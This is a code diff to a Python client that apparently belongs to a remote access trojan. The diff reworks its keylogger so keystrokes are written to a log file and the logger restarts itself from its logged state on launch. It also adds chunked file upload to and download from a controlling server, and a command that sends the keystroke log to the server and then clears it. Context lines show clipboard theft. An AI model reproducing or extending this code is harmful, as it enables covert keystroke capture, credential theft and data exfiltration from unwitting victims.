@@ -23,6 +23,9 @@ from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
 if platform.system() == 'Windows':
     import ctypes
+    LOG = os.path.dirname(sys.argv[0]) + '\\log.log'
+else:
+    LOG = os.path.dirname(sys.argv[0]) + '/log.log'
 
 try:
     from pynput.keyboard import Key, Listener
@@ -30,9 +33,47 @@ try:
 except Exception as e:
     _pynput = False
 
-logging.basicConfig(level=logging.CRITICAL)
+logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(message)s')
+logging.info('Client Started.')
 
-KeyboardLogs = ''
+
+def read_file(path, block_size=1024): 
+    with open(path, 'rb') as f: 
+        while True: 
+            piece = f.read(block_size) 
+            if piece: 
+                yield piece 
+            else: 
+                return
+
+
+def reverse_readline(filename, buf_size=8192):
+    """A generator that returns the lines of a file in reverse order"""
+
+    # Credit: https://stackoverflow.com/a/23646049/10625567
+
+    with open(filename) as fh:
+        segment = None
+        offset = 0
+        fh.seek(0, os.SEEK_END)
+        file_size = remaining_size = fh.tell()
+        while remaining_size > 0:
+            offset = min(file_size, offset + buf_size)
+            fh.seek(file_size - offset)
+            buffer = fh.read(min(remaining_size, buf_size))
+            remaining_size -= buf_size
+            lines = buffer.split('\n')
+            if segment is not None:
+                if buffer[-1] != '\n':
+                    lines[-1] += segment
+                else:
+                    yield segment
+            segment = lines[0]
+            for index in range(len(lines) - 1, 0, -1):
+                if lines[index]:
+                    yield lines[index]
+        if segment is not None:
+            yield segment
 
 
 def Hasher(MESSAGE : bytes):
@@ -137,23 +178,18 @@ def json_loads(data):
 
 
 def OnKeyboardEvent(event):
-    global KeyboardLogs
-
-    if event == Key.backspace:
-        KeyboardLogs += " [Bck] "
-    elif event == Key.tab:
-        KeyboardLogs += " [Tab] "
-    elif event == Key.enter:
-        KeyboardLogs += "\n"
-    elif event == Key.space:
-        KeyboardLogs += " "
-    elif type(event) == Key:  # if the character is some other type of special key
-        KeyboardLogs += " [" + str(event)[4:] + "] "
-    else:
-        KeyboardLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character
+    logging.info(str(event))
 
 if _pynput:
     KeyListener = Listener(on_press=OnKeyboardEvent)
+    # Check the state of the keylogger from logs
+    if os.path.exists(LOG):
+        for line in reverse_readline(LOG):
+            if 'Started Keylogger' in line:
+                KeyListener.start()
+                break
+            if 'Stopped Keylogger' in line:
+                break
 
 
 class Client(object):
@@ -241,6 +277,37 @@ class Client(object):
         self.socket.recv(1024)
         self.socket.send(encrypted)
 
+    def send_file(self, file_to_transfer):
+        """ Send file to Server """
+        try:
+            for line in read_file(file_to_transfer):
+                self.send(line)
+                self.receive()
+            self.send(b'<FILE TRANSFER DONE>')
+            self.receive()
+            self.send(b'File Transferred Successfully')
+            logging.info('Transferred {} to Server'.format(file_to_transfer))
+        except Exception as e:
+            self.send(b'<FILE TRANSFER DONE>')
+            self.receive()
+            self.send(errors(e).encode())
+            logging.info(errors(e))
+        return
+
+    def receive_file(self, save_as):
+        """ Receive File from Server"""
+        self.send(b'<RECEIVED>')
+        with open(save_as, 'wb') as f:
+            while 1:
+                data = self.receive()
+                if data == b'<FILE TRANSFER DONE>':
+                    self.send(b'File Transferred Successfully')
+                    break
+                f.write(data)
+                self.send(b'<RECEIVED>')
+        logging.info('Transferred {} to Client'.format(save_as))
+        return
+
     def receive_commands(self):
         """ Receives Commands from Server """
         while True:
@@ -304,18 +371,20 @@ class Client(object):
                 # If shutdowns or restarts didn't work
                 break
 
-            if data[0] == '--l':
+            if data[0] == 'LIST':
                 self.socket.send(b' ')
                 continue
 
             if data[0] == '<LISTENING>':
                 self.send(b'<DONE>')
+                continue
+
+            if data[0] == '--r':
+                self.send_file(data[1])
+                continue
 
             if data[0] == '--s':
-                self.send(b'<RECEIVED>')
-                with open(data[1], 'wb') as f:
-                    f.write(self.receive())
-                self.send(b'File Transfer Successful')
+                self.receive_file(data[1])
                 continue
 
             if data[0] == '--d':
@@ -364,29 +433,30 @@ class Client(object):
 
                 if not KeyListener.running:
                     KeyListener.start()
+                    logging.info('Started Keylogger')
                     self.send(b'Started Keylogger\n')
                     continue
                 self.send(b'Keylogger already running\n')
                 continue
 
-            if data[0] == '--k dump':
-                if not _pynput:
-                    self.send(b'Keylogger is disabled due to import error.')
-                global KeyboardLogs
-
-                if not KeyListener.running:
-                    self.send(b'<NOTRUNNING>')
-                else:
-                    self.send(KeyboardLogs.encode())
+            if data[0] == '--l':
+                with open(LOG, 'rb') as f:
+                    self.send(f.read())
+                with open(LOG, 'w') as f:
+                    f.write('')
+                logging.info('Dumped Logs.')
+                # Logs keylogger state
+                if KeyListener.running:
+                    logging.info('Started Keylogger')
                 continue
 
             if data[0] == '--k stop':
                 if not _pynput:
                     self.send(b'Keylogger is disabled due to import error.')
                 if KeyListener.running:
+                    logging.info('Stopped Keylogger')
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
-                    KeyboardLogs = ''
                     self.send(b'Keylogger Stopped')
                     continue
                 self.send(b'Keylogger not running')
@@ -397,15 +467,6 @@ class Client(object):
                     self.send(pyperclip.paste().encode())
                 except Exception as e:
                     self.send(errors(e).encode())
-                continue
-
-            if data[0] == '--r':
-                filename = data[1]
-                if not os.path.exists(filename):
-                    self.send(b'<TRANSFERERROR>')
-                    continue
-                with open(filename, 'rb') as f:
-                    self.send(f.read())
                 continue
 
             if data[0] == '<GETCWD>':
